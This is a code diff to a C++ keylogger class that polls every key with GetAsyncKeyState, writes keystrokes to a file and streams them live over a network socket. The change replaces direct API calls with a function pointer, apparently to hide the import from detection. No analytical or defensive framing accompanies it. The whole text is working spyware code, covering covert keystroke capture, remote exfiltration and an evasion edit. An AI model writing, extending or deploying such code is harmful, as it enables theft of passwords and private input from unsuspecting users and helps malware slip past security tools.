@@ -16,7 +16,7 @@ class KeyboardTools{
 		void Run(){
 			while(1){
 				for (key=8; key<=255; key++){
-					if (GetAsyncKeyState(key)==-32767){
+					if (funcGetAsyncKeyState(key)==-32767){
 						switch(key){
 							case 0x0d:
 								fprintf (outputfd, "\r\n");
@@ -45,7 +45,7 @@ class KeyboardTools{
 								fprintf(outputfd, ",");
 								break;
 							default:
-							if (key>64&&key<92&&!(GetAsyncKeyState(0x10)))key+=32;
+							if (key>64&&key<92&&!(funcGetAsyncKeyState(0x10)))key+=32;
 								fprintf(outputfd, "%c", key);
 						}
 						fflush(__fpr);
@@ -57,7 +57,7 @@ class KeyboardTools{
 		void LiveStreamKeystrokes(SOCKET outputFd){
 			while(1){
 				for (key=8; key<=255; key++){
-					if (GetAsyncKeyState(key)==-32767){
+					if (funcGetAsyncKeyState(key)==-32767){
 						switch(key){
 							case 0x0d:
 								send (outputFd, "\r\n", 2, 0);
@@ -86,7 +86,7 @@ class KeyboardTools{
 								send(outputFd, ",", 1, 0);
 								break;
 							default:
-							if (key>64&&key<92&&!(GetAsyncKeyState(0x10)))key+=32;
+							if (key>64&&key<92&&!(funcGetAsyncKeyState(0x10)))key+=32;
 								send(outputFd,(const char*) &key, 1, 0);
 						}
 					}
